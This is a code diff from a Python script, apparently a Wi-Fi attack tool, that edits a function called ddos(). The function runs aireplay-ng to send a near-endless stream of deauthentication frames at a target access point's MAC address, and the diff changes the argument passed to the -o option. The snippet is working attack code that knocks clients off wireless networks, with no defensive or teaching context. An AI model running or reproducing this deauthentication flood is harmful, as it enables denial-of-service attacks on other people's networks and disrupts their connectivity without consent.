@@ -75,7 +75,7 @@ def ddos():
 			print("     ["+G+"+"+W+"] Starting DDOS to "+defaultmac)
 			try:
 				print("     ["+O+"!"+W+"] Press (Ctrl + C) for Stop DDOS")
-				subprocess.call('aireplay-ng --deauth 99999999999 -o 1 -a '+defaultmac+' '+defaultint+'', shell=True)
+				subprocess.call('aireplay-ng --deauth 99999999999 -o '+defaultcha+' -a '+defaultmac+' '+defaultint+'', shell=True)
 			except(KeyboardInterrupt, SystemExit):
 				print("\n     ["+O+"!"+W+"] Stoped DDOS")
 		except(KeyboardInterrupt, SystemExit):
